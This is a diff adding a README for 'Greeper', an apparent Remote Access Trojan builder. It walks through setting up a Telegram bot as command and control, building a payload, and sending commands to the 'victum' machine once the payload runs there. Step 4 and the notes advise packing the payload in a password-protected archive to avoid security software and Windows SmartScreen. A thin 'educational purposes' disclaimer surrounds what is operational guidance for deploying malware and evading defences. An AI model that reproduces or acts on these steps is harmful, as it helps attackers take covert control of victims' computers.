@@ -1,0 +1,58 @@
+README - G!R!
+
+Instructions for Using the Greeper Builder/Payload [Remote Access Trojan (RAT) Tool]
+This document provides detailed instructions on how to use the Remote Access Trojan (RAT) tool for educational purposes.
+Please ensure that you have the necessary permissions and are compliant with all applicable laws before proceeding.
+
+STEP 1: CREATE A TELEGRAM BOT
+	i)   Open Telegram:
+	ii)  Open BotFather: In the search bar, type @BotFather and select the official BotFather account with blue tick.
+	iii) Create a New Bot:
+		 Start a chat with BotFather and send the command /newbot.
+		 Follow the prompts to name your bot and choose a username (it must end with "bot", e.g., MyTestBot).
+	iv)  Obtain Your Bot Token:
+		 After creating the bot, BotFather will provide you with a token copy and keep it.
+		 It will look like this 8664582844:AAE1WX6XLEQa6WAUcBHmfivpu4Ulv9Ci0W4.
+		
+STEP 2: GET YOUR USER ID
+	i)   Find UserInfoBot: In the Telegram app, search for @userinfobot and start a chat.
+	ii)  Retrieve Your User ID:Send any message to the bot, and it will respond with your user ID.
+		 This ID is necessary for the RAT tool to send messages to your Telegram account.
+		
+STEP 3: RUN THE GREEPER_BUILDER
+	i)   Run the Greeper_Builder.bat in the Greeper_Builder folder
+	ii)  You will see a agreement, accept it to continue
+	iii) First the Builder will ask the path of Greeper.py file
+	iv)  Now the Builder will ask Bot token and UserID
+			REMEMBER ctrl+c is not copy in terminal!
+			Just right click to paste.
+	v)   After entering the details, the payload will be made and saved in the payload folder in the same dir of Builder
+		 You may see some warnings like numpy bla bla bla Just Ignore them like your alarm clock!
+
+STEP 4: FINAL STEPS
+	i)   Locate the Payload: it will be saved in a directory specified by the script. Make a note of this location.
+	ii)  Compress the Payload: To avoid detection by security software, compress the payload using 7-Zip.
+		 Set a password to zip to avoid smartscreen in the victum device.
+	iii) Start Your Bot: Before sharing the payload, ensure that you start your bot from your Telegram account at least once.
+		 The payload will not work if the bot is started before sending.
+		
+STEP 5: USING THE PAYLOAD
+	i)	 Share the Payload: When the payload is executed on the target machine, it will establish a connection with your Telegram bot.
+	ii)	 Interact with the Payload: You can send commands to the payload through your Telegram bot.
+		 To get help, send the command /help in the bot chat after the client is online.
+		
+		
+NOTES:
+
+# Send the payload in compressed password protected zip to skip windows smartscreen
+# Single Use of Bot Token: Use a bot token for only one payload. If two clients come online with the same bot token, it will result in a crash.
+
+Feedback and Support
+For any feedback or feature requests, you can reach me out via 
+	Github at www.github.com/giri190507
+	Telegram at @GodInReach
+
+Important Note:
+This tool is intended for educational purposes only.
+Unauthorized access to computer systems is illegal and unethical.
+Always ensure you have the necessary permissions before using this tool.
